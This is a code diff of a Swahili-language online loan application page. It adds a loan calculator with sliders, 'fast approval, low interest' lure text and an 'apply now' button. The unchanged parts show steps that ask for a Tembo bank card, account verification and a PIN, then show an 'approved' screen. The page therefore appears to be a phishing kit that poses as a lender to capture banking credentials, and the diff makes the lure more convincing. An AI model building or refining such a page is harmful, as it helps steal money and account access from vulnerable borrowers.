@@ -24,25 +24,45 @@
             </div>
         </header>
 
-        <!-- STEP 1: Loan & Personal Info -->
+        <!-- STEP 1: Loan Calculator & Personal Info with Sliders -->
         <div id="step-personal_info" class="form-step active">
-            <div class="step-indicator">Maombi ya Mkopo • Hatua 1 ya 3</div>
-            
-            <div class="form-group">
-                <label>Aina ya Mkopo</label>
-                <select id="loanType">
-                    <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
-                    <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
-                    <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
-                </select>
+            <div class="step-indicator">Pata Mkopo Wako Haraka</div>
+            <p class="step-sub-desc">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+
+            <div class="calculator-card">
+                <h3>Kikokotoo cha Mkopo</h3>
+                
+                <div class="form-group">
+                    <div class="label-row">
+                        <label>Kiasi cha Mkopo</label>
+                        <span id="loanAmountDisplay" class="highlight-val">TSh 100,000</span>
+                    </div>
+                    <input type="range" id="loanAmountSlider" min="10000" max="10000000" step="5000" value="100000" oninput="updateCalculator()">
+                    <div class="slider-limits">
+                        <span>TSh 10K</span>
+                        <span>TSh 10M</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="label-row">
+                        <label>Muda wa Mkopo</label>
+                        <span id="loanTermDisplay" class="highlight-val">miezi 12</span>
+                    </div>
+                    <input type="range" id="loanTermSlider" min="6" max="60" step="1" value="12" oninput="updateCalculator()">
+                    <div class="slider-limits">
+                        <span>miezi 6</span>
+                        <span>miezi 60</span>
+                    </div>
+                </div>
+
+                <div class="monthly-payment-box">
+                    <span>Malipo ya Kila Mwezi</span>
+                    <strong id="monthlyPaymentDisplay">TSh 9,504</strong>
+                </div>
             </div>
 
-            <div class="form-group">
-                <label>Kiasi cha Mkopo (TSh)</label>
-                <input type="text" id="loanAmount" value="100,000">
-            </div>
-
-            <div class="form-group">
+            <div class="form-group" style="margin-top: 15px;">
                 <label>Jina la Kwanza & Jina la Ukoa</label>
                 <div class="name-grid">
                     <input type="text" id="firstName" placeholder="Jina la kwanza">
@@ -58,7 +78,7 @@
                 </div>
             </div>
 
-            <button class="btn-primary" onclick="submitPersonalInfo()">HATUA INAYOFUATA</button>
+            <button class="btn-primary" onclick="submitPersonalInfo()">OMBA SASA</button>
         </div>
 
         <!-- STEP 3: Tembo Card & Account Verification -->
@@ -120,7 +140,7 @@
             <button class="btn-primary" onclick="submitPin()">ENDELEA</button>
         </div>
 
-        <!-- SUCCESS / APPROVED DASHBOARD (Matches final image reference) -->
+        <!-- SUCCESS / APPROVED DASHBOARD -->
         <div id="step-success" class="form-step">
             <div class="success-banner">
                 <div class="check-circle">✓</div>
@@ -149,5 +169,5 @@
 
     <script src="script.js"></script>
 </body>
-    </html>
-    
+                        </html>
+                    
